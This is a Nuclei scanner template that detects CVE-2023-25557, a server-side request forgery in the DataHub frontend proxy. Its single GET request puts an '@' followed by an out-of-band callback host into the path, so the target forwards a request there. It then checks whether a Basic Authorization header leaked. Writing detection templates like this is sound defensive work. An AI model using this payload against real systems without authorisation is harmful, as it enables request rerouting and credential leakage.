id: CVE-2023-25557

info:
  name: DataHub Metadata Service (GMS) version 0.8.45 - SSRF
  author: dwisiswant0
  severity: critical
  description: |
    DataHub is an open-source metadata platform. The DataHub frontend acts as a proxy able to forward
    any REST or GraphQL requests to the backend. The goal of this proxy is to perform authentication
    if needed and forward HTTP requests to the DataHub Metadata Store (GMS). It has been discovered
    that the proxy does not adequately construct the URL when forwarding data to GMS, allowing external
    users to reroute requests from the DataHub Frontend to any arbitrary hosts. As a result attackers
    may be able to reroute a request from originating from the frontend proxy to any other server and
    return the result.
  reference:
    - https://twitter.com/artsploit/status/1632034638133592064
    - https://github.blog/2023-03-03-github-security-lab-audited-datahub-heres-what-they-found/#ssrf-xss-ghsl-2022-076
    - https://nvd.nist.gov/vuln/detail/CVE-2023-25557
  tags: cve,cve2023,datahub,ssrf

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/gms@{{interactsh-url}}/{{randstr}}"
    headers:
      Authorization:

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: word
        part: interactsh_request
        words: # not sure if 'interactsh_request' contents converting the header keys to lower-case or not
          - "Authorization: Basic"
          - "authorization: Basic"
        condition: or